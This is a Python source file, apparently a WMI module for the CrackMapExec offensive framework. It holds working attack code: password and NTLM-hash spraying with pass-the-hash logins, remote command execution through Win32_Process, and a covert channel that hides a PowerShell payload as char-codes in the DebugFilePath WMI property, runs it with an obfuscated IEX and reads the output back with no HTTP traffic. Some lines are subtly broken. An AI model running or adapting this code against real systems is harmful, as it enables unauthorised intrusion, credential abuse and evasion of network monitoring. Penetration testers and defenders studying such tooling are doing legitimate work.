########################################################################################
# Inspired and code partially stolen from :
#    WMI Shell: https://github.com/Orange-Cyberdefense/wmi-shell
#    WMImplant: https://github.com/FortyNorthSecurity/WMImplant
########################################################################################

import sys
import os
import ntpath
import argparse
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.transport import DCERPCTransportFactory
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.dcom.wmi import CLSID_WbemLevel1Login
from impacket.dcerpc.v5.dcom.wmi import IID_IWbemLevel1Login
from impacket.dcerpc.v5.dcom.wmi import WBEM_FLAG_FORWARD_ONLY
from impacket.dcerpc.v5.dcom.wmi import IWbemLevel1Login
from impacket.smbconnection import SMBConnection, SessionError
from cme.connection import *
from cme.logger import CMEAdapter
from cme.helpers.logger import highlight
from cme.helpers.misc import *
from cme.helpers.powershell import create_ps_command
from pywerview.requester import RPCRequester

import pprint
import cchardet
import re
import time
#from termcolor import colored

from io import StringIO 


class wmi(connection):

    def __init__(self, args, db, host):
        #print 'Filename: ' + sys._getframe(0).f_code.co_filename + '        Method: ' + sys._getframe(0).f_code.co_name
        self.domain = ''
        self.hash = ''
        self.lmhash = ''
        self.nthash = ''
        self.namespace = args.namespace
        self.backup_value = ''
        self.server_os = None
        self.smbv1 = None

        #if args.domain:
        #    self.domain = args.domain

        connection.__init__(self, args, db, host)

    @staticmethod
    def proto_args(parser, std_parser, module_parser):
        #print 'Filename: ' + sys._getframe(0).f_code.co_filename + '        Method: ' + sys._getframe(0).f_code.co_name
        wmi_parser = parser.add_parser('wmi', help="own stuff using WMI", parents=[std_parser, module_parser], conflict_handler='resolve')
        wmi_parser.add_argument("-H", '--hash', metavar="HASH", dest='hash', nargs='+', default=[], help='NTLM hash(es) or file(s) containing NTLM hashes')
        wmi_parser.add_argument("--port", type=int, default=135, help="WMI port (default: 135)")
        wmi_parser.add_argument("--no-bruteforce", action='store_true', help='No spray when using file for username and password (user1 => password1, user2 => password2')
        wmi_parser.add_argument("--continue-on-success", action='store_true', help="continues authentication attempts even after successes")

        # For domain options
        dgroup = wmi_parser.add_mutually_exclusive_group()
        dgroup.add_argument("-d", metavar="DOMAIN", dest='domain', type=str, default=None, help="domain to authenticate to")
        dgroup.add_argument("--local-auth", action='store_true', help='authenticate locally to each target')

        egroup = wmi_parser.add_argument_group("Mapping/Enumeration", "Options for Mapping/Enumerating")
        egroup.add_argument("--query", metavar='QUERY', type=str, help='issues the specified WMI query')
        egroup.add_argument("--execute", metavar='EXECUTE', type=str, help='creates a new cmd.exe /c process and executes the specified command with output')
        egroup.add_argument("--namespace", metavar='NAMESPACE', type=str, default='root\\cimv2', help='WMI Namespace (default: root\\cimv2)')
    
        return parser
    
    def proto_flow(self):
        self.proto_logger()
        if self.create_conn_obj():
            self.enum_host_info()
            self.print_host_info()
            if self.login():
                if hasattr(self.args, 'module') and self.args.module:
                    self.call_modules()
                else:
                    self.call_cmd_args()

    def proto_logger(self):
        self.logger = CMEAdapter(extra={'protocol': 'WMI',
                                        'host': self.host,
                                        'port': self.args.port,
                                        'hostname': self.hostname
                                        })

    def get_os_arch(self):
        try:
            stringBinding = r'ncacn_ip_tcp:{}[135]'.format(self.host)
            transport = DCERPCTransportFactory(stringBinding)
            transport.set_connect_timeout(5)
            dce = transport.get_dce_rpc()
            if self.args.kerberos:
                dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
            dce.connect()
            try:
                dce.bind(MSRPC_UUID_PORTMAP, transfer_syntax=('71710533-BEBA-4937-8319-B5DBEF9CCC36', '1.0'))
            except (DCERPCException, e):
                if str(e).find('syntaxes_not_supported') >= 0:
                    dce.disconnect()
                    return 32
            else:
                dce.disconnect()
                return 64

        except Exception as e:
            logging.debug('Error retrieving os arch of {}: {}'.format(self.host, str(e)))

        return 0

    def create_conn_obj(self):
        try:
            dcom = DCOMConnection(self.host, self.username, self.password, self.domain, self.lmhash, self.nthash, oxidResolver=False)
            iInterface = dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login, IID_IWbemLevel1Login)
        except Exception as e:
            if "rpc_s_access_denied" in str(e):
                return True
        return False
    
    def enum_host_info(self):
        # smb no open, specify the domain
        if self.args.domain:
            self.domain = self.args.domain
            self.logger.extra['hostname'] = self.hostname
        else:
            try:
                smb_conn = SMBConnection(self.host, self.host, None)
                try:
                    smb_conn.login('', '')
                except SessionError as e:
                    if "STATUS_ACCESS_DENIED" in e.message:
                        pass

                self.domain = smb_conn.getServerDNSDomainName()
                self.hostname = smb_conn.getServerName()
                self.server_os = smb_conn.getServerOS()
                self.logger.extra['hostname'] = self.hostname

                try:
                    smb_conn.logoff()
                except:
                    pass

            except Exception as e:
                logging.debug("Error retrieving host domain: {} specify one manually with the '-d' flag".format(e))

            if self.args.domain:
                self.domain = self.args.domain

            if self.args.local_auth:
                self.domain = self.hostname

    def print_host_info(self):
        self.logger.info(u"{} (name:{}) (domain:{})".format(self.server_os,
                                                            self.hostname,
                                                            self.domain))

    def plaintext_login(self, domain, username, password):
        try:
            self.password = password
            self.username = username
            self.domain = domain
            dcom = DCOMConnection(self.host, self.username, self.password, self.domain, self.lmhash, self.nthash, oxidResolver=False)
            iInterface = dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login, IID_IWbemLevel1Login)

            out = u'{}\\{}:{} {}'.format(domain,
                                        self.username,
                                        self.password,
                                        highlight('({})'.format(self.config.get('CME', 'pwn3d_label'))))
            self.logger.success(out)
            if not self.args.continue_on_success:
                return True
        
        except Exception as e:
            self.logger.error(u'{}\\{}:{} {}'.format(domain,
                                                    self.username,
                                                    self.password,
                                                    e))
            return False

    def hash_login(self, domain, username, ntlm_hash):
        lmhash = ''
        nthash = ''

        if ntlm_hash.find(':') != -1:
            lmhash, nthash = ntlm_hash.split(':')
        else:
            nthash = ntlm_hash
        try:
            self.username = username
            self.password = ''
            self.domain = domain
            self.hash = ntlm_hash
 
            if lmhash: self.lmhash = lmhash
            if nthash: self.nthash = nthash

            dcom = DCOMConnection(self.host, self.username, self.password, self.domain, self.lmhash, self.nthash, oxidResolver=False)
            iInterface = dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login, IID_IWbemLevel1Login)

            out = u'{}\\{}:{} {}'.format(domain,
                                         self.username,
                                         ntlm_hash,
                                         highlight('({})'.format(self.config.get('CME', 'pwn3d_label'))))

            self.logger.success(out)
            if not self.args.continue_on_success:
                return True

        except Exception as e:
            self.logger.error(u'{}\\{}:{} {}'.format(domain,
                                                    self.username,
                                                    ntlm_hash,
                                                    e))
            return False

    def query(self, wmi_query=None, namespace=None, printable=True):
        #print 'Filename: ' + sys._getframe(0).f_code.co_filename + '        Method: ' + sys._getframe(0).f_code.co_name
        records = []
        if not namespace:
            namespace = self.namespace
        try:
            self.RPCRequest._create_wmi_connection(namespace=namespace)
            if wmi_query:
                output = self.RPCRequest._wmi_connection.ExecQuery(wmi_query, lFlags=WBEM_FLAG_FORWARD_ONLY)
            else:
                output = self.RPCRequest._wmi_connection.ExecQuery(self.args.query, lFlags=WBEM_FLAG_FORWARD_ONLY)
        except Exception as e:
            return e

        while True:
            try:
                wmi_results = output.Next(0xffffffff, 1)[0]
                record = wmi_results.getProperties()
                records.append(record)
                if printable:
                    for k,v in record.items(): 
                        #print 'getting value : ' + k
                        if type(v['value'])==str:
                            enc = cchardet.detect(v['value'])['encoding']
                            #print 'encoding type :' + enc
                            self.logger.highlight(k + ' => ' + v['value'].decode(enc))
                            #self.logger.highlight(k + ' => ' + v['value'].enc)
                        else: 
                            self.logger.highlight('{} => {}'.format(k,v['value']))
                self.logger.highlight('')
            except Exception as e:
                if str(e).find('S_FALSE') < 0:
                    raise e
                else:
                    break
        return records

    def get_values(self, records=None, rowlimit=None): 
        values = {}
        if not rowlimit:
            rowlimit = len(records)
        limit = 1
        try: 
            for i in range(limit):
                record = records[i]
                for k,v in record.items():
                    values[k] = v['value']
        except Exception as e:
            self.logger.error('Error getting WMI query results: {}'.format(e))
        return values

    def update(self, wmi_object_name='Win32_OSRecoveryConfiguration', wmi_property='DebugFilePath', namespace=None, update_value=None):
        def check_error(banner, resp):
            if resp.GetCallStatus(0) != 0:
                print ('%s - marshall ERROR (0x%x)') % (banner, resp.GetCallStatus(0))
            else:
                pass

        if not namespace:
            namespace = self.namespace
        if not update_value:
            print ('Set an update_value !')
            exit(0)
        try:
            dcom = DCOMConnection(self.host, self.username, self.password, self.domain, self.lmhash, self.nthash, oxidResolver=False)
            iInterface = dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login, IID_IWbemLevel1Login)
            iWbemLevel1Login = IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
            iWbemLevel1Login.RemRelease()
        
            wmiClass, callResult = iWbemServices.GetObject(wmi_object_name)
            wmiClass = wmiClass.SpawnInstance()

            ########### setting the exact same values from the current instance to the new instance 
            values = self.get_values(self.query('Select Caption, Description, SettingID, AutoReboot, DebugFilePath,  DebugInfoType, ExpandedDebugFilePath, ExpandedMiniDumpDirectory, KernelDumpOnly, MiniDumpDirectory, Name, OverwriteExistingDebugFile, SendAdminAlert, WriteDebugInfo, WriteToSystemLog From Win32_OSRecoveryConfiguration', namespace, printable=False))
            for k in values:
                setattr(wmiClass, k, values[k])

            ########### Seems like type differences for int and boolean values are not correctly handled in impacket.dcerpc.v5.dcom.wmi, so we have to do them manually
            # Here are Win32_OSRecoveryConfiguration attribute CIM types:
            #string:
            #    Caption
            #    Name
            #    DebugFilePath
            #    Description
            #    ExpandedDebugFilePath
            #    ExpandedMiniDumpDirectory
            #    MiniDumpDirectory
            #    SettingID
            #
            #boolean:
            #    AutoReboot
            #    KernelDumpOnly
            #    OverwriteExistingDebugFile
            #    SendAdminAlert
            #    WriteDebugInfo
            #    WriteToSystemLog
            #
            #uint32:
            #    DebugInfoType

            wmiClass.SettingID = str(wmiClass.SettingID)
            wmiClass.Caption = str(wmiClass.Caption)
            wmiClass.Description = str(wmiClass.Description)
            wmiClass.AutoReboot = int(wmiClass.AutoReboot == 'True')
            wmiClass.OverwriteExistingDebugFile = int(wmiClass.OverwriteExistingDebugFile == 'True')
            wmiClass.WriteDebugInfo = int(wmiClass.WriteDebugInfo == 'True')
            wmiClass.WriteToSystemLog = int(wmiClass.WriteToSystemLog == 'True')

            ############ updating the target property value
            wmiClass.DebugFilePath = update_value
            ############ IMPORTANT : after update, ExpandedDebugFilePath has garbage byte values, so we reset it (will be replaced by Windows later, so no pb)
            wmiClass.ExpandedDebugFilePath = "" 

            check_error('Writing to DebugFilePath', iWbemServices.PutInstance(wmiClass.marshalMe()))
            dcom.disconnect()

        except Exception as e:
            self.logger.error('Error creating WMI connection: {}'.format(e))


    def execute(self, command=None):
        #print 'Filename: ' + sys._getframe(0).f_code.co_filename + '        Method: ' + sys._getframe(0).f_code.co_name
        if not command:
            self.logger.error("Missing command in wmi exec() !")
            return
        shell_cmd = 'cmd.exe /Q /c ' + command

        dcom = DCOMConnection(self.host, self.username, self.password, self.domain, self.lmhash, self.nthash, oxidResolver=True)
        iInterface = dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login,IID_IWbemLevel1Login)
        iWbemLevel1Login = IWbemLevel1Login(iInterface)
        iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
        iWbemLevel1Login.RemRelease()

        win32Process, callResult = iWbemServices.GetObject('Win32_Process')
        win32Process.Create(shell_cmd, 'C:\\', None)
        dcom.disconnect()
        return


    def degen_ps_iex_cradle(self, payload=None):
        results = []
        if not payload:
            self.logger.error("ERROR degen_ps_iex_cradle : no payload !")
        m = re.search('DownloadString\(\'.+?://.+?/.+?\'\)\n\$cmd = (.+)?\n', payload)
        ####### ^ remember to grab all names and commands - see cme.helpers.powershell -> gen_ps_iex_cradle
        if m: 
            return m.group(1)
        return results    


    def ps_execute(self, payload=None, get_output=False, methods=None, force_ps32=False, dont_obfs=False):
        #print 'Filename: ' + sys._getframe(0).f_code.co_filename + '        Method: ' + sys._getframe(0).f_code.co_name

        script_command = self.degen_ps_iex_cradle(payload)
        encoded_script = ','.join(map(str,map(ord,self.module.ps_script)))
        len_enc_script = len(encoded_script)
        ####### ^ remember to make it for all ps_scripts{1,2,...}. Some modules have more than one PS script.

        self.backup_value = self.get_values(self.query('Select DebugFilePath From Win32_OSRecoveryConfiguration', self.namespace, printable=False))['DebugFilePath']
        self.update(update_value=encoded_script)

        decode_script_command = '''
$a = Get-WMIObject -Class Win32_OSRecoveryConfiguration; $a = [char[]][int[]]$a.DebugFilePath.Split(',') -Join ''; $a | .(-Join[char[]]@(105,101,120));$output = ({script_command} | Out-String).Trim(); $EncodedText = [Int[]][Char[]]$output -Join ','; $a = Get-WMIObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $EncodedText; $a.Put()
'''.format(script_command=script_command)

        #print 'Decode script command is : ' + decode_script_command
        ps_comm = create_ps_command(decode_script_command, force_ps32=False, dont_obfs=False)

        #print 'Executing : ' + ps_comm
        self.execute(ps_comm)
    
        #sys.stdout.write('Waiting a few seconds for output to be inserted in DebugFilePath ..')
        while True:
            exec_result = self.get_values(self.query('Select DebugFilePath From Win32_OSRecoveryConfiguration', self.namespace, printable=False))['DebugFilePath']
            len_exec_result = len(exec_result) 
            time.sleep(1)    
            #sys.stdout.write('.')
            if not len_exec_result == len_enc_script:
                break

        #print 'Detected encoding : ' + cchardet.detect(exec_result)['encoding']

        output = ''.join(map(chr,map(int,exec_result.strip().split(',')))) 

        #print colored(output, 'yellow', attrs=['bold'])
        #print 'Detected encoding2: ' + cchardet.detect(self.backup_value)['encoding']
        #print 'Restoring initial value : ' + self.backup_value

        self.update(update_value=self.backup_value)

        context = self.module_logger(self.module)
        self.send_fake_response(output, self.module, self.host, context)

    def send_fake_response(self, data, module, host, context):
        # Two options here: 
        #     - send a real HTTP response with the output to CME's HTTP Server ; but the module send back a HTTP Status 200 Reply and we don't want any HTTP network traffic
        #     - just give a fake object to the module's on_response() method, and all is well!  
        len_data = len(data)
        fake_file_obj = StringIO.StringIO(data)
        fake_headers = type('', (object,), {'getheader': lambda self,x: len_data})()
        fake_response = type('', (object,), {'client_address':[host], 'rfile': fake_file_obj, 'headers': fake_headers, 'end_headers': lambda self:None, 'stop_tracking_host': lambda self:None, 'send_response': lambda self,x: None})()
        module.on_response(context, fake_response)